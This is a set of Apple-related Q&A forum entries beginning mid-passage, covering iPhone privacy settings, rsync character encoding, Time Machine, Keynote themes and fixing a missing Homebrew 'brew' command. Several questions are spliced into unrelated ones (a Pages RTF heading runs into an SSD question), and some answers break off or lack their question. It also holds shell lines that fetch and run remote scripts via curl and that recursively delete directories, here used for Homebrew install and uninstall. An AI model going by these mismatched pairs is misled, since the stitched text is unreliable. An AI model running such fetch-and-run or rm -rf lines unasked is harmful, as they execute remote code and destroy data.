(the older system, not to be confused with Family Sharing), etc.\n\n*There are clearly trade-offs between the usability and convenience of a smartphone, and the degree to which you prioritize privacy and security.\n\n*Assuming you are using a non-Apple secure email provider, there is little concern about Apple being able to access your email. Secure POP/IMAP/SMTP is encrypted directly between your device and your email provider. Similar for web browsing to secure (https) sites.\n\n*Take a long look at all available Settings, in the context of the threats you are most concerned about. There are privacy-related settings in areas other than Settings>Privacy.\n\n*I'd suggest considering keeping all three radios off unless explicitly needed (cellular, wi-fi, bluetooth) to protect against carrier and local physical tracking. I'd also suggest keeping Location Services turned off at all times. But before you do, especially if you will use it from time to time, tweak the detailed Location Services settings to restrict what kinds of accesses apps and Apple can have. If you have Location Services on at the same time as Wi-Fi, Apple will, like Google and others do, catalog the GPS Location of wi-fi access points the device can \"see\" - this includes yours and those belonging to others. Bonus to keeping radios and/or Location Services off: improved battery life.\n\n*Make sure your passcode is strong (more than just four digits), and make sure your AppleID account(s) are strongly secured. If you are concerned about people seeing activity happening on your phone, set the Settings>Passcode>RequirePasscode appropriately and restrict what notifications and info appear in your lock screen.\n\n*Never associate your device with an \"integrated\" Facebook or Twitter account. There is some evidence that \"integrated\" apps have privileged access to private APIs.\n\n*In Settings>Privacy>Advertising, turn on Limit Ad Tracking and frequently Reset Advertising Identifier. VendorID is another unique ID apps can access. To reset VendorID, you must delete every app from that vendor. Then you may re-install them.\n\n*Don't use HealthKit apps. The legal protections are very unclear at this point, but are likely nowhere near as good as traditional channels such as doctors.\n\n*Don't use Siri if you don't want your Contacts sent to Apple. There are reasonable privacy protections built around Siri's access to your Contacts, but they will be sent to Apple when you turn Siri on. Apple says they are deleted every time you turn Siri off.\n\n*Restrict Spotlight Search and Safari from pinging external servers for outside data. See: Settings>General>Spotlight Search & Settings>Safari.\n\n*Turn off Background App Refresh Settings>General>Background App Refresh, or at least only allow apps that support it to use Background App Refresh only when they are the active app. This is especially important if you use Location Services or allow apps access to other unique patterns such as Motion, Microphone, Camera, etc. Bonus: improved battery life.\n\n*Set Settings>Privacy>Diagnostics & Usage to \"Don't Send\".\n\n*If you do use Location Services and have weather in your Notification Center, your location will be periodically sent to weather.com.\n\n*Name your phone something common/generic, in Settings>General>About>Name. Apps have access to your device name.\nMore here:\nhttps://www.apple.com/br/ipad/business/docs/iOS_Security_Oct12.pdf\nand here:\nhttps://www.apple.com/privacy/manage-your-privacy/\n\nA: Tapping Settings > General > About > Diagnostics & Usage will allow you to choose between Automatically Send and Don't Send.\nTurn off iCloud and don't use it at all on iPhone.\nSettings > iCloud, then tap to turn on or off iCloud features\nAlso review Apple Legal/Privacy Page for full detailed information.\n\nA: when it comes to privacy Apple is your biggest friend.\n\"if I have an Apple ID registered with my real name, address, etc. will Apple and/or iCloud always know all my browsing data, my emails, email passwords, etc.?\"\nsimple answer: no. just no. In fact unlike most companies Apple can't even bypass your password or anything like that. They need your permission for everything. \n\"e.g. would using fake personal data help?\"\nDon't do this, purely for the sake of getting future support. Like I said Apple can't access your data in any way without your permission\n", "Q: How can I save a document from Pages in RTF format?

In energy settings there are several options concerning the power consumption of you mac, like dim display, app nap, but also \"Put harddisk to sleep when possible\".\nTo my knowledge, an HD hard disk can go to sleep, it will stop spinning and park its heads.\nBut I have an original SSD build in my retina MacBook Pro. Can this SSD disk go to sleep as well?\n\n\nA: As to what I'm aware, an SSD does not classify as a hard disk, therefore it will not go to sleep as part of this option. (I'm not even sure you can make them go to sleep to begin with.)\nUsing a laptop with an internal SSD as its only form or storage will make this setting of no use. However if there is say an external HDD plugged in, it will abide to this setting.\nBut back on topic, an SSD will not obey this setting.\n", "Q: Installed provision profiles not seen on iOS8?

I know I can remove profiles from Xcode - Devices. But that's only for the ones installed with my associated development account.

Hope this helps anyone\n\nA: According to a StackOverflow answer here, \"If the provisioning profile is expired, iOS should get rid of it automatically. As apps are deleted, iOS should properly deal with the provisioning aspects automatically. This philosophy is mentioned in WWDC 2014's talk on Managing Apple Devices around ~42 minutes in.\"\nI just uninstalled GBA4iOS and the provisioning profile is still there, even after a reboot.

I then had some problems with the backup file (became inexplicably locked) and while I was trying to figure that out I clicked on the \"Don't use\" option in the disk select panel (big mistake as it turns out).  The disk disappeared from the list of those available.  I subsequently fixed the problem with the backup file.  I can now mount it and time machine can see it under \"browse other disks\".  Is there any way I can \"undo\" the \"Don't use\" option to make the disk visible again for use as backup?  I can't delete/re-install the remote disk so it would need to be something local.  Does anybody know where the flag that prevents that disk being displayed is located?  (I am running Mavericks on an imac).\n\nA: An excellent question. There may be a file on your backup drive called .com.apple.timemachine.donotpresent. Remove it, if it's there, and that should solve your problem. The file is invisible, so you'll have to use Terminal's rm to remove it.\nHowever, with SMB, Time Machine doesn't support it natively, so you may have to run this command in Terminal for the drives to appear.

If I made change to a contact which cames from the yahoo contact list, the change happens only to the contact on yahoo. \nBut the thing is I want to maintain the same contact list on every account. \nIt means if I add a new contact on my iPhone, It should be added to all my accounts(iCloud, Yahoo and Google).\nIs there a way to do this?\n\nA: Pick 1 and stick with it.\nI have had similar issues, and wanted to synchronise multiple accounts, AND multiple devices. This is technically hard.\nFor example. What would happen if you have no internet on your phone, but you change the information of 4 contacts from your me.com account. In just a minute later someone changes the information of these contacts on gmail.com. 10 minutes later your phone has internet and wants to sync the 4 contacts with me.com.\nNow gmail and me.com are in conflict. Who is right? This will results in unwanted duplicates and deletions. You do not want that.\nTherefor my suggestion would be to pick 1 and stick with it. I have chosen for Apple's me.com, but that is just my personal preference.\nHow to merge them?\n\n\n*\n\n*Make backups!\n\n*At first, you need to set up all accounts in Contacts\n\n*Select the contacts group on the left, select all contacts.\n\n*Now drag these contacts onto the contacts group you want to import them to. Contacts.app will ask you if you want to import the cards and it tells you that duplicates will be merged. You want this.\n\n*Now you only need to disable the account in the Contacts.app preferences (Command-comma).

This will be helpful if I clean install mavericks in that I would not have to install 10.9.4 and then run combo. Also it will take less storage in one pack. more manageable for me.\nI started to re-download the mavericks from app store. It was a bit slower than last time. taking several hours. time to time I was checking progress in launch pad. After several hours when I checked back, system was in sleep mode. I logged and in AppStore, progress was 'Installing ... 9 minutes left' and stuck there for hours. several restarts I did but no avail. \nIt is amazing why the install process started automatically without user interaction after the download completes?\nSecondly, I lost the purpose of downloading i-e the installer. My purpose was to save mavericks installer 10.9.5 for later use. But in app folder, the x icon is showing only a few KB. That is definitely unpleasing after approx 8 hrs of download.\nWhere is the installer now which was downloaded ?\nAnother attempt: I tried to download under a MAC-Mavericks(guest VMware on windows 7 Host). This machine's HDD is about 26GB. with plenty of space free. But after 3GB download, AppStore started giving error\nError: 'We could not complete your purchase... you need 4.97GB of free space to download os x...'\nThat is pinching. At this moment free space is 4.54GB. I am unable to delete anything from MAC components like iTunes etc to make little more space to complete the download. Also unable to expand this machines HDD from VMWARE. Perhaps there also space issue. The windows partition where this machine resides is 25GB with 10GB free. When I try to expand it says there is no free space on the file system for this  operation. Perhaps VMware expands in this way: first creates a duplicate of the main vmdk then do something to increase its space and delete the original vmdk. Or for other reasons it IS asking more space to increase the vmdk of mac vm. \n**Please suggest something to get the purpose: obtain mavericks 10.9.5 fro App store for  later use. can something be done to preserve those above one complete and one half way (under vmware) download attempts ** \n\nA: Just upgrade as normal.

I left it on download while changed in App Store preferences not to install system file etc..  \n\nDownload completed, installation proceeded on itself again and installer stuck at 9 min remaining showing in App Store purchases.\nLike before, the X icon in Applications folder is 168KB only.\nI found some stuff downloaded at a different location but I am not sure is it the installer can it be made the installer. because size shows similar to installer. \nHere: \n\n/applications/private/var/folders/8s/97n9msts6yb6tnly4djln2v00000gn/C/com.apple.appstore/675248567/aqk8899627438837780594.pkg\n\n\nIn Applications folder, the X icon is 168KB only\n\nPerhaps Apple have changed the download and install behavior for Maverick installer.

The first time all is well, but apparently there is a problem with special characters between the mac and linux machine, since every time I run the rsync operation after that, the files with special characters are first deleted and then re-synced. It seems as if there is a problem with different character sets.\nThe preferred solution seems to be to use the --iconv option:\n\nYou can use rsync's --iconv option to convert between UTF-8 NFC & NFD,\n  at least if you're on a Mac. There is a special utf-8-mac character\n  set that stands for UTF-8 NFD. So to copy files from your Mac to your\n  NAS, you'd need to run something like:\nrsync -a --iconv=utf-8-mac,utf-8 localdir/ mynas:remotedir/\nThis will convert all the local filenames from UTF-8 NFD to UTF-8 NFC on the\n  remote server. The files' contents won't be affected.\n\nThat sounds all and well, but my mac does not seem to recognise that option, since I get: \n>     MyMachine:~ Macuser$ /usr/bin/rsync -av --delete --iconv=utf-8,utf-8-mac user@linuxmachine:/home/linuxuser/Test/ /Users/Macuser/Test/\n>     rsync: --iconv=utf-8,utf-8-mac: unknown option\n>     rsync error: syntax or usage error (code 1) at /SourceCache/rsync/rsync-42/rsync/main.c(1333) [client=2.6.9]\n\nAny suggestions on what to do?\nEDIT: the rsync version on my mac is 2.6.9.\nMacuser$ rsync --version\nrsync  version 2.6.9  protocol version 29\n\nIf that version does not support the --iconv option, how do I update in a safe manner?\nEDIT: I finally figured out that apart from updating rsync, I also had to switch the order in which I specified the character sets, so I added an answer below.\n\nA: I finally figured out that apart from updating rsync, I also had to switch the order in which I specified the character sets: I thought you were supposed to specify the character set in the order of transformation; but it seems as that is not the correct syntax. Rather, one should always use --iconv=utf-8-mac,utf-8 when initialising the rsync from the mac, and always use --iconv=utf-8,utf-8-mac when initialising the rsync from the linux machine, no matter if I want to sync files from the mac or linux machine.\nThen @Mark's solution works like magic!\n\nA: The --iconv argument was added in rsync version 3.0.0 (release notes) OSX provides only version 2.6.9 (see Apple's open source page)\nThus you need to get a newer version of rsync. The latest is 3.1.2 (2.6.9 was released in 2006)\nI would also get a newer version rsync as xattr copying was also introduced after 2.6.9\nI think the simplest way to get a new rsync is to install a package manager like Macports or Homebrew and then install rsync or you can install from the source\n", "Q: What are the best apps for rescuing deleted data on flash drives? I'm searching for an app to rescue my deleted data on my flash memory. They happily deleted with a Windows virus. What's your recommendation for this case?\n\nA: I recommend ProSoft's Data Rescue which can recover a very wide variety of file types. Even if you don't see the file type listed, ProSoft maybe able to help you recover the data. I once had a client delete a their QuickBook's for Mac data file. It was a new version of QuickBooks with a radically different file format from prior versions. The current Data Rescue didn't recover the data; however, ProSoft was able to provide a new file definition and all of the data was recovered. \nThere are separate Mac and PC versions of Data Rescue. I have used both with good results, but I have far more experience with the Mac version.\nI find $99 for Data Rescue to be a very fair price, however, if you are only needing to recover image files from digital cameras, checkout ProSoft's Image Rescue for $20. I believe Image Rescue comes with both Mac and PC licenses. \n\nA: I've had good luck with Recuva. I've also used TestDisk to recover data from a corrupt flash drive. \n", "Q: how do I get everything back to normal (partition issue) Okay, so I've recently shifted to Mac from Windows. I was curious to check out what the Yosemite OS looked like, and hence I downloaded the beta and had it up and running. It was downloaded on the primary hd. \nThere were already a few backups on my time machine, so I decided to erase the primary macintosh hd and restore the backups. Everything got erased and it's all lying as a corestorage unit now. It says that there is no available space and all the options have been greyed out. I don't know how to create the partitions now and all efforts are in vain. Any help would be appreciated. \n\nA: Try using cmd + R during startup and booting to the Recovery HD.  \nBooting to Recovery HD.\nOpen up DiskUtility from the menu and you should be able to access the drives and re-partition them and restore the OS again.\n", "Q: Change user name I had to change the admin user name of a new Macbook because his sons name kept showing up, Home Folder etc, So I used, \n'sudo mv /Users/oldusername /Users/newusername'\nand Advanced Options in User account.\nNow this has worked very well apart from iBooks!\niBooks still has the 'oldusername' in it's path.\nDon't know what I've done wrong!!!\nsudo mv /Users/oldname/Library/Containers?com.apple.BKAgentService?Data?Documents?ibooks/books/ Users/newname/Library/Containers?com.apple.BKAgentService?Data?Documents?ibooks/books\nWould this work ?, I am not very good with terminal.\nAny help would be appreciated.\n\nA: The command should be:\n$sudo mv /Users/oldname/Library/Containers/com.apple.BKAgentService/Data/Documents/ibooks/books  /Users/newname/Library/Containers/com.apple.BKAgentService/Data/Documents/ibooks/books\n\nThis is assuming that there was not an existing user \"newname\" with it's own uid. Then you may run into permissions problems.\nHope this helps!\n", "Q: Keynote - How do I get rid of the default background images? So.  I'm using keynote to build slides for church music overheads.  This means I need to build a different slide deck for each song we sing, so that we can change out the songs from week to week.  \nThe baseline file size for a keynote presentation is about ½ MB, which is huge once you get a library of up to 40-50 presentations.  And it's completely unnecessary, because all I have is simple text on a solid background.\nI did a little digging, and the culprit is the default background images for slide masters that I'm not using.  Eliminate these images from the package contents, and my baseline file size drops to under 100K, which is to say, reasonable.\nThe problem is that Keynote really wants those images to be there, and it puts up an error message every time.\nRecommendations?\n\nA: So you went to your Keynote presentation document file and used the Finder to \"Show Package Contents\" then you deleted the image files you found in there. That would cause problems. Try this:\nOpen a new Keynote document and select the Theme that you want to use as the basis for your presentation. Now do...\n\n\n*\n\n*View -> Edit Master Slides\n\n*Delete all Master Slides that you don't need.\n\n*If you need a Master Slide with an image, replace the image with a small place holder image. For example, a JPG file with a solid color. \n\n*Remove the Back Ground Image from All Remaining master slides, and remove any other unneeded elements from the slides.\n\n*Click the Done button at the bottom of the Master Slide editing screen\n\n*File -> Reduce File Size (which will probably do nothing)\n\n*File -> Save Theme...\n\n*Give it a name such as \"Church Music\"\n\n\nNow you can create a new presentation using the \"Church Music\" theme. Your theme will be on the \"My Themes\" tab of the theme browser. After you save, you can now view the presentation's Package Contents to make sure that there is no unused items. Keynote will generate a variety of slide previews and other images which you need to keep, but these should be very small. If there is stuff that you really don't need, you might try re-editing the Themes Master Slides.\n", "Q: Update from os x 10.4 to 10.9 with time machine backup I have a iMac (compatible with os x 10.9) running 10.4 Tiger.\nHow do I upgrade this to OSX 10.9 as AppStore is not available under 10.4.\nI do have a time machine backup from my macbook pro running mac os x 10.9. Is it possible to import the 10.9 time machine backup to my old imac running tiger?\n\nA: You can create a bootable Mavericks USB flash drive or DVD on your Macbook Pro (the 10.9) machine using the steps in this Apple note\nYou can then boot your iMac off this media and install 10.9\nYou can connect the iMac to your Time Machine backup (e.g. plug the disk in or attack via network) and during the install tell the install to get data from the Time Machine backup.\nYou can't install a version of  OSX from a Time Machine backup you need to install OSX first.\nAn alternative is to create a bootable backup from the 10.9 machine using Carbon Copy Cloner or Superduper etc and then boot the iMac from that and restore from it.\n\nA: You will need to at least buy the upgrade to Snow leopard (10.6). From that you may perform an in place upgrade to 10.9.  You may want to be sure your device supports 10.9, it has to be 2007 or later, in general.  I don't think that importing Time Machine from a newer to old version will work.\n", "Q: Export iPhone 3GS contacts into iCloud I bought an iPhone 6 and I would like to use all the contacts from my iPhone 3GS.\nSome of the contacts were stored in iCloud. The other ~480 contacts are on my iPhone 3GS. How can I transfer these to my iPhone 6?\n\nA: Using an applitcation like iBackupBot found here:http://www.icopybot.com/itunes-backup-manager.htm\nYou can plug in your iphone 3gs and make a backup, it will back up all contacts Like so:\n\nNow you go ahead and plug in your new iphone 6 and click the restore button.\nGive it a minute or two, depending on your computer and you should have all your contacts on your brand new iPhone 6!\nHope you enjoy the iPhone 6, I know I am!\n\nA: You might be able to make the \"on the iPhone\" contacts go up to iCloud.\nFirst, backup the iPhone in iTunes so if everything goes wrong you can go back to the way things were. Then for good measure, backup your computer too, particularly the contacts/calendars/etc. that get stored in iCloud.\nNow that everything is safely backed up, on the iPhone, delete the iCloud account from the phone, and when it asks you if you want to keep copies of the iCloud data (contacts, calendars, etc) on the phone, tell it to delete them all from the phone. Once this is done, your iPhone should only have the data that is NOT in iCloud. Now you should re-setup your iCloud account on this phone. I am pretty sure that setting up iCloud on the phone will cause all of the phone's \"local\" data to merge with the data in iCloud. Once all the phone data is in the iCloud system, you can again sign the old iPhone out of iCloud (remember to remove FindMyiPhone if you are passing this phone on to someone else) and when you sign the new iPhone into iCloud, it should have all of your data.\nIf you don't want this data in iCloud, the method that KAS suggested might be better.\n", "Q: synch, restore, backup I'm afraid I messed up my Iphone.  I plugged it into my computer for the first time ever.  It prompted me to backup so I did (silly me).  At the end of the back up it prompted me to log in with my son's account instead of mine.  Now my phone info is gone and my son's phone from 2011 is on my phone and my phone is gone!  Help\n\nA: If you backed up your phone to the computer then you should be able to restore that backup to your iphone using itunes. If not hopefully you set icloud as your backup. You can restore your phone from icloud using these directions: http://support.apple.com/kb/ph12521. Hope it helps.\n", "Q: Scriptable menu bar icons Is there an easy way I can add custom icons to the menu bar status area? Ideally something like Growl (e.g., where you can just execute a command) but instead of notifications, just renders icons in the menu bar.\nI'm mainly looking to draw numbers that I'd use to alert me of various things. For example, I can configure my email client to run a command/AppleScript to update the numbers when an certain kind of email arrives.\nSomething like this:\n\n\nA: I would suggest starting with this thread, which describes using Cocoa Objective-C calls from within AppleScript. There is an example Xcode project here.\nAnd Launch is a complete application written in AppleScript that functionally does this. Its Xcode project file is here.\nThe basic premise is to generate NSMenuItem instances and add them to the system's NSStatusBar:\nset statusMenu to (NSMenu's alloc)'s initWithTitle_(\"Launch\")\n-- (build and do stuff with the statusMenu here)\nset sysStatusBar to NSStatusBar's systemStatusBar\nset statusItem to sysStatusBar's statusItemWithLength_(32)\ntell statusItem to setMenu_(statusMenu)\ntell statusItem to setHighlightMode_(1)\nset menuImage to NSImage's imageNamed_(\"icon.png\")\ntell statusItem to setImage_(menuImage)\n\nAppleScript excerpt from Launch's source code, Copyright © Lee Hanken\n\nA: Okay, I have made an app for this. It is on GitHub: 0942v8653/ScriptableStatusBar. Just keep the app running and use the sbar tool to set and remove items.\nAs the readme says:\nsbar set face  'Bye!:sbar remove face'\n\nCreates a face in the status bar. The menu will have an option Bye! that runs sbar remove face getting rid of the menu it creates.\n\nYou can download a compiled version from https://github.com/0942v8653/ScriptableStatusBar/releases.\n\nA: You can also use RubyCocoa:\nrequire \"osx/cocoa\"\ninclude OSX\n\napp = NSApplication.sharedApplication\nstatusitem = NSStatusBar.systemStatusBar().statusItemWithLength(NSVariableStatusItemLength)\nstatusitem.setTitle(\"aa\")\napp.run\n\n\nA: Another option is to use Rumps, a Python library that uses the Obj-C classes and functions.\nhttp://rumps.readthedocs.org/en/latest/\n\nA: Yes, you can create a Cocoa app for this purpose in Xcode. No, you cannot do it with applescript.\n", "Q: Need to reset admin password with OS X 10.6.8 Will this impact Time Machine backup? I have Mac OS X 10.6.8, connected to Time Machine backing up my files. I see directions you gave for resetting admin password. I'm wondering if I can just keep Time Machine plugged in while I reboot and reset. Will I keep all old files? Do I need to know anything about accessing them with a new password? Just making sure I don't lose files! Tx!\n\nA: Resetting the password should not do anything to the files stored by Time Machine. Files on the system are associated with a user ID, and changing or resetting a password does not alter the user ID. \nIf you delete the account that holds the files you are interested in, this will not directly delete the matching files in the Time Machine backups, but as Time Machine continues to run and throw out old backups, eventually the files deleted from the computer will be removed from the Time Machine backups. But as mentioned, just changing the password of a user account (even an administrator account) does not change the documents made by that user.\n", "Q: OSX 10.9.5 - different keyboard layouts per application From what I see in the Googles, there used to be a way to set it so that each application/window could have its own keyboard layout.  I have two different apps, and I need different layouts for each one (Dvorak for one, and US for the other).\nIt seems like that feature may have been removed sometime between the stuff I'm seeing in Google and the current 10.9.5 version.  Is there another way to accomplish this now?\n\nA: If you're using Keyboard Maestro for this, use the action called \"Set keyboard layout to\" instead of the applescript. It instantly changes the layout without pulling down the menu.\n\nA: As @LeeJoramo suggested, you can use Keyboard Maestro and some AppleScript to turn on the desired layout when switching to a certain app. For example, here's a KM macro that sets my keyboard layout to \"Greek\" when I switch to TextMate:\n\nThe script, borrowed from this StackOverflow answer:\ntell application \"System Events\" to tell process \"SystemUIServer\"\n    tell (menu bar item 1 of menu bar 1 whose description is \"text input\")\n        select\n        tell menu 1\n            click (first menu item whose title contains \"Greek\")\n        end tell\n    end tell\nend tell\n\n\nA: There is an app which is aupposed to be able to do this, but I have not tried it mayself:  AutoKeyboard\nhttp://www.macupdate.com/app/mac/51829/autokeyboard\n\nA: I use the keyboard switching as well.\nTo do that I just click on the menu bar Input source name Icon and select the keyboard I need.\n\nThat assumes you set the Input Sources in your sys pref key board, and you can choose the Automatically switch to documents input source as well if you prefer.\nAuto switch:\n\nChoose an input source for a document and have it used every time you\n  work in the document until you close it, even if you switch to other\n  documents that use other input sources in the meantime.\nThis option appears only when you add a second input source.\n\n\n", "Q: iPhone: Disable vibration for all notifications except for phone calls How can I disable vibrations for all notifications except for phone calls on an iPhone? This is for an iPhone 6 running iOS 8.\nFor instance, if I receive a notification such as a new email, my phone vibrates. And when I get phone calls, my phone vibrates. But when I disable vibration, it disables vibration for both notifications and phone calls.\nSo I'd like to separate the two, so that I don't get vibrations for notifications, but I do get vibrations for phone calls.\nIs there a way to do this, without needing to enable vibrations and disabling vibrations on an app-by-app basis?\n\nA: You can turn off vibrations for individual events from Settings > Sounds.\n\n\n\nYou can turn them all off, turn off all but Ringtone (receiving phone calls), or keep them all on.\nNote: Any events that are not listed here can be turned off from the apps that produce them.\n\nA: The only way I know is to go to iPhone Settings > Notifications and modify the settings for each app so that Vibration is set to None.\n", "Q: To prevent Finder from showing .noindex files I can restrict Finder searching files by adding .noindex -extension, this thread. \nHowever, I want hide those files in Finder search. \nHow can you prevent Finder from showing .noindex -files?\n\nA: There are a variety of ways to hide things in Mac OS X. Note: if you do any of these you most likely do not need to use the .noindex extensions since files hidden from the finder will not be typically be shown in Finder Spotlight searches.\n\n\n*\n\n*chflags hidden fileToHide (as already mentioned) does this by setting OS X file attributes.\n\n*use the Unix style period at the start of a file name .fileToHide, of course this will hide the file from the Finder and the command line. \n\n*create a .hidden at the file system root and list the filenames of files to hide from the Finder. This was the way to do it in the first several versions of Mac OS X prior to the chflags method. \n\n*There is also a classic Mac OS 9 file attribute that can hide files, but this should be considered highly depreciated\n\n\nNote that the various hiding methods and .noindex should all work on Folders too. \n\nA: In the command line use:\nchflags hidden fileToHide\nTo show files again chflags nohidden ...\n", "Q: Disconnecting charger while Macbook Pro Retina is still turned on Is it safe to disconnect (unplug the charger from) my Macbook Pro Retina 13\" while the computer is turned on and running?\n\nA: Absolutely it is safe.\nIt has been designed for that, it does not have a locked in plug, but a magnetically coupled plug for that reason.\nI have done that on purpose or by accident (tripping over the cable) many times without problems.\n", "Q: Mac OS X (10.9.2) Terminal: Getting Weird Characters ~$â out of nowhere I am getting the following weird characters:\n$â followed by a paragraph sign.

This just started happening out of the blue.\nAny ideas?\n\nA: Mark, you are 100% right! I have no idea how those characters got into my /.bash_profile, but they did! So I just went in there and removed them and now all is working correctly. Thanks again!\n", "Q: Transfer printers to other mac? I have a mac running 10.6 that has a dozen or so different printers set up on it. I am working on setting up a new machine to replace it, but would rather not have to set up all the printers again on the new machine. Is there any way to transfer the printer list from the old machine to the new one?\nI would assume I would still need to re-install any drivers, as the ones on the old machine are doubtless hopelessly out-of-date, but that's relatively easy. Also note that I don't care about printer settings, I just need the printer definition.\n\nA: Printer setup information is stored in /etc/cups, so simply copying that directory from the old machine to the new, and re-installing any needed print drivers successfully populates the printer list on the new machine.\n\nA: The plist that holds the list of installed printers is located in /Library/Printers/InstalledPrinters.plist\nYou could grab a copy of that and move it to the new machine.  I would imagine that you would need to fix permissions after moving this to a new machine.\n", "Q: Having separte Apple accounts on same device I have couple of questions to ask related to one topic.\nI live in japan and had my apple account installed there. \nAnd now I am here in US for a year and want to make another apple id so i could redeem iTunes gift card here in US. Is it possible to have another apple id on one iPhone?\nWhen I get back in Japan (for example, I downloaded apps using my US iTunes account) and logged in on my Japanese iTunes account, will the apps I downloaded in US iTunes disappear on my phone?\n\nA: When you change countries, you will no longer receive app update notifications on your iOS device or in iTunes for the apps you purchased in your original country. \nHowever, you will still be able to download those applications again for free if they are present on your new country's store (even if they are updated). \nYou will not be charged and the download will not appear on your Purchased page. \nIf the app is not available in your new country, you will not be able to download it again.\n", "Q: MacBook Pro early 2011: sound loop, black screen Over the last week I have had four similar incidents:\nWhen I played something on YouTube, the audio just loops for a few seconds, and then either the screen freezes or a black screen will appear.\nFor the first three times, booting up will result in blue screen with black vertical lines, grey screen or black screen.

Their PostgreSQL install has been a major pain for a long time because it's tended to conflict with other installs. I reported a bug about it years ago. It's a major issue if their upgrade process is discarding user data, as it seems to be, though.\nI suggest installing a PostgreSQL server for your development use. Popular choices are Homebrew and Heroku's Postgres.app . See https://www.codefellows.org/blog/three-battle-tested-ways-to-install-postgresql .\nIf you want to try to integrate your app into the Server app like you did before, you'll need to set host: /Library/Server/ProfileManager/Config/var/PostgreSQL in database.yml. But really, I'm pretty sure Apple's trying to make that a private PostgreSQL instance for just their use...\n", "Q: Spotlight not showing Bing results on iOS 8 I'm running iOS 8.0.2 on iPhone 5 and was really hyped about being able to get web search results from Spotlight.\nUnfortunately whenever I type a query into Spotlight it doesn't display Bing results.\nAny guesses on what the issue here could be? (Screenshot attached below)\n\n\nA: There's only one location in Settings where I've seen reference to this.

Is there any way to fix this? Similarly, anything downloaded to the folder shows up in the top left, piling on top of anything else that might be there. This ends up in a giant stack of mess that's annoying and cluttered. How do I fix such problems?\n\nA: You could change the \"view\" of the ~/Downloads folder to something other than \"as icons\" from the Finder menu \"View\". In \"list\" or \"column\" mode, they would not be on top of each other.\nAlternatively, under the \"View\"->\"Show View Options\" you could set it to \"Sort By\" -> \"Snap to Grid\" and all new icons would be nicely arranged it a grid. Additionally \"Arrange by\" -> \"Name\" would put things in alphabetical order, and not all on top of each other.\n\nA: Change sort by to something other than none or snap to grid, e.g. change it to name or creation date.\n\n(I am new to macos and expected \"snap to grid\" to actually keep the icons in a grid but with this option set it behaves just as in your screenshot. I don't really understand why, but using another sorting option fixes it, so whatever)\n", "Q: Turn off all connectivity except GPS I am leaving on a camping trip tomorrow. I have an iPhone 6 from my employer. I would like to use the phone for GPS (vis Google Maps) over the weekend, but do not want to receive a single notification for a phone call, text message, calendar invite or email (I am using the Good app). Is there any way to put my phone on airplane mode but keep GPS on? Thanks in advance.\n\nA: If you want to completely disable all cellular abilities (calls, texting, data) you could simply take out the SIM.  True GPS still works fine, as that does not use the cellular network.\n\nA: You can go to Settings and turn Cellular Data off (turn WiFi off for good measure also in case you wander past a WiFi network). Also turn on Do Not Disturb mode. You still use the cell radio to locate your position, unlike in Airplane Mode.\n\n", "Q: Why does my brew installation not work? I installed brew before, but it does not work now.\nWhen I run brew, it gives me the error -bash: brew: command not found\nSo I tried to reinstall using the code \nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n\nBut it gives me another one :\n\nIt appears Homebrew is already installed. If your intent is to reinstall you\n  should do the following before running this installer again:\n  rm -rf /usr/local/Cellar /usr/local/.git && brew cleanup\n\nIf I use the command rm -rf /usr/local/Cellar /usr/local/.git && brew cleanup, it gives back the first error : -bash: brew: command not found\nWhat should I do now?\n\nA: echo 'eval \"$(/opt/homebrew/bin/brew shellenv)\"' >> ~/.zprofile\neval \"$(/opt/homebrew/bin/brew shellenv)\"\n\nThis code works for me on a MacBook Pro M1.\n\nA: If your shell is zsh and your Mac is M1-based\nedit .zshrc\nnano .zshrc\n\nadd\nexport PATH=/opt/homebrew/bin:$PATH\n\nQuit terminal and re-open\ntry with\nbrew\n\n\nA: \"Command not found\" indicates that the brew binary isn't on one of the directories listed in your PATH environment variable. To check what your path is currently, run echo $PATH. By default, brew installs to /usr/local/bin. To set the path permanently, you should edit your ~/.bashrc file to contain the line export PATH=\"/usr/local/bin:$PATH\".\nOn Aplle Silicon machines brew by default install path is /opt/homebrew/bin\n\nA: I had the same problem—installed brew, used it, but now it doens't work, ie, brew command not recognized anymore.\nThe context of my brew-not-recognized-anymore problem is a bit more specific: I'm using iTerm instead of Terminal, I installed brew in the standard way to the standard place, I used brew to install zsh and oh-my-zsh, and at that point the brew command stopped working.\nI wasn't able to find the solution to my subset of the brew-not-recognized-anymore problem anywhere, so I'm posting the solution in case anyone else has this sort of brew-not-recognized-anymore problem.\nAdding this to my .zshrc solved the problem on a machine with Apple M1 CPU:\neval $(/opt/homebrew/bin/brew shellenv)\n\nNote that this is not the same as adding to the PATH variable. The brew command is indeed located in those standard locations listed in other solutions. It turned out not to be a PATH variable thing that was causing this subset of the brew-not-recognized-anymore problem.\n\nA: the -bash: brew: command not found error means that it didn't find the brew environment variable on your Mac.\nThe correct environment configuration in .bash_profile file should be like this:\nexport PATH=\"/usr/local/bin:$PATH\"\n\nSo if you haven't config the brew environment variable, the correct step to config the brew environment variable on your Mac is:\n\n\n*\n\n*add the environment variable to your mac, the correct command is:\necho 'export PATH=\"/usr/local/bin:$PATH\"' >> ~/.bash_profile\n\n\n*Now we need to activate the changes. Type this command to activate and try drew doctor again:\nsource .bash_profile\n\nOr if you had config the environment, you can use this command to open the file to check if the environment configuration is correct:\n/usr/bin/open ~/.bash_profile\n\nand then fix it to the correct text and then save and quit.\n\n*Don't forget to activate your changes also. Still this command:\nsource .bash_profile\n\nA: If your shell is zsh and your Mac is M1-based, enter these two commands after installing brew:\necho 'eval \"$(/opt/homebrew/bin/brew shellenv)\"' >> ~/.zprofile\neval \"$(/opt/homebrew/bin/brew shellenv)\"\n\nThe first command adds:\n\n*\n\n*an expanded PATH variable that includes the directories where brew and commands installed with brew are located\n\n*several shell variables used by brew\nto the .zprofile initialization file.\nThe second command adds those same variables to the current shell, so that you can start using brew without re-reading .zprofile.\nPS: For Intel Macs, use /usr/local instead of /opt/homebrew.\nPPS: If you are running bash, use .bashrc instead of .zprofile.\n\nA: The FAQ has a section on this and a specific uninstall script, start there to get a clean system and then install again.\nhttps://github.com/Homebrew/homebrew/blob/master/share/doc/homebrew/FAQ.md\n\nTo uninstall Homebrew, paste the command below in a terminal prompt.\nruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/uninstall)\"\nDownload the uninstall script and run ./uninstall --help to view more uninstall options.\n\n\nA: Might be that you just never downloaded..

